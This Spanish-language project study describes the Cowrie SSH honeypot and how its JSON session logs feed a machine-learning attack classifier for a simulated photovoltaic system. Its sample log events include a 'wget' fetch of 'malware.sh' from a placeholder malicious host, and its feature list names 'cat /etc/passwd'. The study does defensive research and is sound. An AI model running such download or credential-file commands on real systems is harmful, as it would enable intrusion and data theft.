# Estudio del honeypot Cowrie y su aplicación en el proyecto

## 1. ¿Qué es un honeypot?

Un honeypot es un sistema de seguridad diseñado deliberadamente para aparentar ser un objetivo legítimo y atractivo, con el propósito de atraer atacantes, registrar sus acciones y obtener inteligencia sobre sus tácticas, técnicas y procedimientos. A diferencia de los mecanismos de defensa tradicionales, cuyo objetivo es bloquear o prevenir intrusiones, un honeypot opera desde una postura pasiva: no interrumpe al atacante, sino que lo observa y documenta su comportamiento de forma detallada.

Su finalidad no es proteger activos reales, sino generar información de valor para la detección, el análisis y la comprensión de amenazas. En este sentido, un honeypot cumple cuatro funciones fundamentales en el ámbito de la ciberseguridad: detectar actividad maliciosa que podría pasar desapercibida para otros mecanismos, analizar las herramientas y técnicas empleadas por los atacantes, comprender los patrones de comportamiento asociados a distintos tipos de intrusión y obtener inteligencia sobre amenazas emergentes o específicas de un dominio determinado.

Frente a otros mecanismos de detección como los sistemas IDS basados en firmas o en anomalías estadísticas, el honeypot presenta ventajas relevantes: genera muy pocos falsos positivos, ya que toda interacción con él es por definición sospechosa; permite capturar ataques desconocidos o variantes no catalogadas; y produce registros altamente detallados del comportamiento del atacante, que incluyen credenciales, comandos, archivos y secuencias de acciones difíciles de obtener con otros métodos.

Sus limitaciones principales radican en que solo captura ataques que efectivamente interactúan con él, sin visibilidad sobre amenazas internas ni sobre el tráfico que no alcanza sus servicios; y en que, si no está bien aislado, puede convertirse en un punto de entrada hacia sistemas reales de la red.

## 2. Clasificación de honeypots

Los honeypots se clasifican según dos criterios principales: su propósito y su nivel de interacción.

### Según su propósito

**Honeypots de producción:** se implementan dentro de organizaciones reales como componente activo de su estrategia de seguridad, con el objetivo de detectar actividad sospechosa dentro de la red corporativa o de infraestructura. Su valor reside en la detección temprana de intrusos que han logrado evadir las defensas perimetrales.

**Honeypots de investigación:** su objetivo principal es el estudio sistemático de tácticas, técnicas y procedimientos utilizados por atacantes, con fines académicos, de inteligencia de amenazas o de desarrollo de nuevos mecanismos de detección. El presente proyecto se enmarca principalmente en esta categoría, dado que su propósito es generar evidencia empírica sobre el comportamiento de ataques dirigidos a infraestructuras fotovoltaicas simuladas.

### Según el nivel de interacción

**Baja interacción:** simulan servicios básicos respondiendo un conjunto limitado de solicitudes sin ejecutar un sistema operativo real. Son fáciles de desplegar y presentan bajo riesgo de compromiso, pero capturan información limitada sobre el comportamiento del atacante.

**Alta interacción:** ejecutan sistemas operativos y servicios reales o muy similares a los de producción, lo que permite registrar interacciones profundas y detalladas. Su mayor riqueza informativa viene acompañada de mayor complejidad de despliegue y mayor riesgo operativo.

**Media interacción:** ofrecen un equilibrio entre el realismo del entorno y la seguridad del despliegue. Simulan servicios con suficiente fidelidad como para atraer y mantener la interacción del atacante, sin ejecutar un sistema operativo completamente real. Cowrie es generalmente clasificado como un honeypot de media interacción, ya que proporciona un entorno suficientemente realista para mantener la interacción del atacante sin ejecutar un sistema operativo real completo. No obstante, algunos autores lo ubican dentro de la categoría de baja interacción avanzada debido a que la emulación se limita a servicios específicos, lo que lo convierte en una opción adecuada para el proyecto al combinar riqueza de datos con viabilidad de implementación sobre hardware embebido.

## 3. ¿Qué es Cowrie?

Cowrie es un honeypot de media interacción escrito en Python, diseñado para emular servicios SSH y Telnet con el objetivo de registrar la actividad de atacantes que intentan acceder a sistemas expuestos en red. Fue desarrollado por Michel Oosterhof como una evolución del honeypot Kippo y es ampliamente utilizado en investigación de ciberseguridad por su capacidad de generar registros estructurados y detallados de cada sesión.

Cowrie no ejecuta un sistema operativo real. En su lugar, presenta al atacante un entorno simulado que responde de forma verosímil a los comandos más comunes, incluyendo una estructura de sistema de archivos configurable, respuestas a comandos de reconocimiento como `uname`, `id`, `ls` o `cat`, y la posibilidad de simular la descarga de archivos externos. Esta simulación es suficientemente convincente para mantener la interacción del atacante durante el tiempo necesario para registrar sus intenciones y técnicas, sin exponer ningún sistema real.

## 4. Funcionamiento de Cowrie

En entornos de despliegue reales, Cowrie suele ejecutarse sobre puertos no privilegiados (por ejemplo, 2222), utilizando mecanismos de redirección para exponer externamente el servicio sobre el puerto 22/TCP, manteniendo así la apariencia de un servicio SSH convencional y, opcionalmente, en el puerto 23 (Telnet). Cuando un agente externo intenta establecer una conexión, Cowrie presenta una pantalla de autenticación que puede configurarse de dos formas: aceptar credenciales predefinidas, lo que prolonga la interacción y permite registrar los comandos ejecutados tras el acceso; o rechazar todos los intentos, registrando en ese caso únicamente la actividad de fuerza bruta. En ambas configuraciones, cada intento de autenticación queda registrado con la dirección IP de origen, el nombre de usuario, la contraseña utilizada y la marca temporal del evento. Esto permite capturar tanto sesiones de fuerza bruta como sesiones de acceso efectivo.

Una vez que el atacante obtiene acceso, Cowrie le presenta un entorno de shell simulado. Cada comando que el atacante ejecuta es interceptado, registrado y, dependiendo de la configuración, puede recibir una respuesta simulada o ser ignorado. Si el atacante intenta descargar archivos mediante `wget` o `curl`, Cowrie puede registrar la URL de descarga y simular la transferencia sin ejecutar el archivo real.

Toda la actividad queda registrada en tiempo real en archivos de log estructurados en formato JSON, uno por sesión. Aunque múltiples eventos pertenecen a una misma sesión, Cowrie registra cada acción como un evento independiente, por lo que resulta necesario un proceso posterior de correlación mediante el identificador de sesión para reconstruir el comportamiento completo del atacante, que incluyen el identificador único de sesión, la dirección IP de origen, las credenciales utilizadas, cada comando ejecutado con su marca temporal y los archivos descargados o intentados. Adicionalmente, Cowrie puede exportar los eventos a bases de datos relacionales, sistemas SIEM o plataformas de análisis mediante sus módulos de salida configurables.

## 5. Información registrada

Cowrie genera eventos estructurados en formato JSON para cada tipo de acción detectada. Los principales tipos de evento y sus campos relevantes son los siguientes:

### Intento de autenticación fallido — `cowrie.login.failed`

```json
{
  "eventid": "cowrie.login.failed",
  "src_ip": "192.168.1.15",
  "username": "admin",
  "password": "admin123",
  "timestamp": "2026-06-12T14:20:00Z",
  "session": "a1b2c3d4"
}
```

### Autenticación exitosa — `cowrie.login.success`

```json
{
  "eventid": "cowrie.login.success",
  "src_ip": "192.168.1.15",
  "username": "root",
  "password": "123456",
  "timestamp": "2026-06-12T14:21:03Z",
  "session": "a1b2c3d4"
}
```

### Comando ejecutado — `cowrie.command.input`

```json
{
  "eventid": "cowrie.command.input",
  "src_ip": "192.168.1.15",
  "username": "root",
  "input": "wget http://malicious.host/malware.sh",
  "timestamp": "2026-06-12T14:25:00Z",
  "session": "a1b2c3d4"
}
```

### Descarga de archivo — `cowrie.session.file_download`

```json
{
  "eventid": "cowrie.session.file_download",
  "src_ip": "192.168.1.15",
  "url": "http://malicious.host/malware.sh",
  "outfile": "/tmp/malware.sh",
  "timestamp": "2026-06-12T14:25:05Z",
  "session": "a1b2c3d4"
}
```

### Cierre de sesión — `cowrie.session.closed`

```json
{
  "eventid": "cowrie.session.closed",
  "src_ip": "192.168.1.15",
  "duration": 47.3,
  "timestamp": "2026-06-12T14:25:50Z",
  "session": "a1b2c3d4"
}
```

El campo `session` presente en todos los eventos permite agrupar todas las acciones de una misma conexión bajo un identificador común, lo cual es fundamental para la construcción del dataset, donde cada fila representará una sesión completa y no un evento individual.

## 6. Relación con la arquitectura del proyecto

En la arquitectura del sistema propuesto, Cowrie se ubica en la capa de captura, actuando como el componente principal de registro de interacciones sobre el servicio SSH señuelo expuesto en el puerto 22. Su posición en el flujo de datos es la siguiente:

```
Interacción externa
(fuerza bruta · acceso SSH · reconocimiento)
        │
        ▼
     Cowrie
(puerto 22 · emulación SSH)
        │
        ▼
  Logs JSON por sesión
(credenciales · cmds · duración · IP · timestamps)
        │
        ▼
   Parser Python
(agregación por session ID · extracción de features)
        │
        ▼
      SQLite
(persistencia estructurada · atributos + etiqueta)
        │
        ▼
  Dataset etiquetado
        │
        ▼
   Random Forest
```

Cowrie es el único componente del sistema capaz de registrar con detalle el contenido de las sesiones SSH: qué credenciales intentó el atacante, qué comandos ejecutó una vez dentro y cuánto tiempo permaneció activo. Esta información no puede obtenerse únicamente a partir de la captura de tráfico con tcpdump, ya que el contenido de las sesiones SSH está cifrado en el tráfico de red real. Cowrie lo captura porque es él mismo quien controla la capa de presentación del protocolo, interceptando los datos antes de que sean cifrados o tras descifrarlos.

## 7. Variables potenciales para Machine Learning

A partir del análisis de los logs generados por Cowrie, se identifican las siguientes variables con potencial para ser utilizadas como características de entrada al clasificador:

| Variable             | Tipo     | Derivación                                                                                 |
| -------------------- | -------- | ------------------------------------------------------------------------------------------ |
| `n_intentos_auth`    | Numérica | Conteo de eventos `login.failed` + `login.success` por sesión                              |
| `auth_exitosa`       | Binaria  | 1 si existe al menos un evento `login.success`, 0 en caso contrario                        |
| `credencial_default` | Binaria  | 1 si la combinación usuario/contraseña está en lista de credenciales por defecto conocidas |
| `usuario_existente`  | Binaria  | 1 si el usuario intentado corresponde a un usuario del sistema simulado                    |
| `n_comandos`         | Numérica | Conteo de eventos `command.input` por sesión                                               |
| `duracion_sesion`    | Numérica | Campo duration del evento session.closed, expresado en segundos (por ejemplo: 47.3 s)                                  |
| `descargo_archivo`   | Binaria  | 1 si existe al menos un evento `file_download` en la sesión                                |
| `tipo_cmd_wget`      | Binaria  | 1 si algún comando contiene `wget` o `curl`                                                |
| `cmd_reconocimiento` | Binaria  | 1 si se detectan comandos como `uname`, `id`, `whoami`, `cat /etc/passwd`                  |
| `hora_del_dia`       | Numérica | Hora extraída del timestamp del primer evento de la sesión                                 |

### Reflexión sobre la diferenciación de sesiones

Una sesión legítima sobre el honeypot, en caso de existir, se caracterizaría por un número muy bajo de intentos de autenticación, credenciales no pertenecientes a diccionarios de ataque conocidos y ausencia de comandos de reconocimiento o descarga. En contraste, una sesión de fuerza bruta presenta un volumen alto de intentos fallidos en un intervalo corto, mientras que una sesión de acceso exitoso malicioso tiende a mostrar comandos de reconocimiento del sistema, intentos de escalada de privilegios o descarga de herramientas externas.

El identificador de sesión de Cowrie es el elemento articulador que permite agregar todos los eventos de una misma conexión en una sola fila del dataset, asociando a cada sesión un vector de características y una etiqueta de clase.

## 8. Conclusiones

Cowrie constituye el componente más informativo de la capa de captura del sistema propuesto. Su capacidad de registrar credenciales, comandos y comportamiento post-autenticación en sesiones SSH lo convierte en una fuente de datos especialmente rica para la construcción del dataset del clasificador, ya que los atributos que genera son directamente representativos de las intenciones del atacante y no simplemente de los patrones de tráfico de red.

Su clasificación como honeypot de media interacción lo hace viable para el despliegue sobre la Raspberry Pi 4 del proyecto, sin comprometer la seguridad del entorno de laboratorio ni requerir recursos computacionales excesivos. La integración de sus logs JSON con la base de datos SQLite, mediada por el parser Python que agrega eventos por identificador de sesión, garantiza que cada interacción capturada se convierta en un registro estructurado y etiquetable, listo para incorporarse al proceso de construcción del dataset.

Finalmente, cowrie cubre específicamente las clases de fuerza bruta SSH y comportamiento malicioso post-autenticación del conjunto de etiquetas definido para el clasificador. En consecuencia, la definición de la Clase 2 se amplía para englobar ambos escenarios: no solo los intentos repetidos de autenticación fallida, sino también las sesiones SSH en las que el atacante logra acceso exitoso y ejecuta a continuación comandos de reconocimiento, escalada de privilegios o descarga de herramientas externas. Esta ampliación es coherente con el comportamiento que Cowrie registra de forma nativa y no requiere introducir una clase adicional, dado que en ambos casos el vector de ataque es el servicio SSH y el origen de los datos es el mismo componente de captura. Las clases de escaneo de puertos, denegación de servicio, ataque de repetición e inyección de datos falsos sobre los servicios Modbus TCP y MQTT son cubiertas por la captura de tráfico mediante tcpdump y los logs específicos de los servicios señuelo correspondientes.

## Referencias

- Oosterhof, M. (2023). *Cowrie SSH/Telnet Honeypot*. Repositorio oficial: https://github.com/cowrie/cowrie
- Spitzner, L. (2002). *Honeypots: Tracking Hackers*. Addison-Wesley.
- Sokol, P., Míšek, J., & Husák, M. (2017). Honeypots and honeynets: issues of privacy. *EURASIP Journal on Information Security*, 2017(1), 1–9.
- Nawrocki, M., Wählisch, M., Schmidt, T. C., Keil, C., & Schönfelder, J. (2016). A survey on honeypot software and data analysis. *arXiv preprint arXiv:1608.06249*.
- Chamotra, S., Sehgal, R. K., & Misra, R. S. (2018). Honeypot baiting and forensics for proactive cyber threat intelligence. *Computers & Security*, 73, 182–200.
